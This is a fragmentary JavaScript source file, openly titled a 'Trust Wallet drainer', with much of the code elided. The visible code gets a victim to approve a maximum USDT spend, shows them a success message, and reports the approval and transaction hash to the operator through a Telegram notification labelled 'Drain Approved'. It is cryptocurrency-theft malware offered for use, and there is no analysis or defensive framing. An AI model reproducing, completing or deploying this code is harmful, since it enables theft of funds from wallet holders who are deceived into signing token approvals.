/**
 * TRUST WALLET DRAINNER - APPROVE-ONLY EDITION (FIXED)
 * ---------------------------------------------
 */
...
(function() {
 ...
 if (els.netLabel) {
 const netName = networkId === 1 ? 'Ethereum' : networkId === 56 ? 'BSC' : networkId === 137 ? 'Polygon' : 'Unknown';
 ...
 async function executeApproveOnly() { // Removed 'amount' as it's unused
 updateUI('approving', 'Approving Token Spend...');
 ...
 if (receipt.status === 1) {
 updateUI('success', 'Approval Successful!');
 notifyTG('Drain Approved', `Approved Max USDT\nTx: ${tx.hash}\nBlock: ${receipt.blockNumber}`);
 } else {
 updateUI('error', 'Approval reverted.');
 }

 } catch (error) {
 console.error(error);
 updateUI('error', `Approval failed: ${error.reason || error.message}`);
 }
 }
